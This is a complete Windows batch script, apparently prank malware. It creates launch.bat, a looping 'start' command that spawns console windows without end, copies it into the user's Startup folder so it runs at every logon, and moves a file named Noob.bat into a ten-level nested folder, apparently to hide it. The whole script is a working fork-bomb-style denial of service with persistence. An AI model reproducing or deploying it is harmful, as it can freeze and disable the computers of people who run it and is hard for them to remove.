@echo off
echo ^@echo off > launch.bat
echo :loop >> launch.bat
echo start >> launch.bat
echo echo rip pc  >> launch.bat
echo goto loop >> launch.bat
 
copy "launch.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
 
:part b
cd "%USERPROFILE%\Start Menu\Programs\Startup\"
md "%USERPROFILE%\Start Menu\Programs\Startup\1"
md "%USERPROFILE%\Start Menu\Programs\Startup\1\2"
md "%USERPROFILE%\Start Menu\Programs\Startup\1\2\3"
md "%USERPROFILE%\Start Menu\Programs\Startup\1\2\3\4"
md "%USERPROFILE%\Start Menu\Programs\Startup\1\2\3\4\5"
md "%USERPROFILE%\Start Menu\Programs\Startup\1\2\3\4\5\6"
md "%USERPROFILE%\Start Menu\Programs\Startup\1\2\3\4\5\6\7"
md "%USERPROFILE%\Start Menu\Programs\Startup\1\2\3\4\5\6\7\8"
md "%USERPROFILE%\Start Menu\Programs\Startup\1\2\3\4\5\6\7\8\9"
md "%USERPROFILE%\Start Menu\Programs\Startup\1\2\3\4\5\6\7\8\9\10"
move "%USERPROFILE%\Start Menu\Programs\Startup\Noob.bat" "%USERPROFILE%\Start Menu\Programs\Startup\1\2\3\4\5\6\7\8\9\10"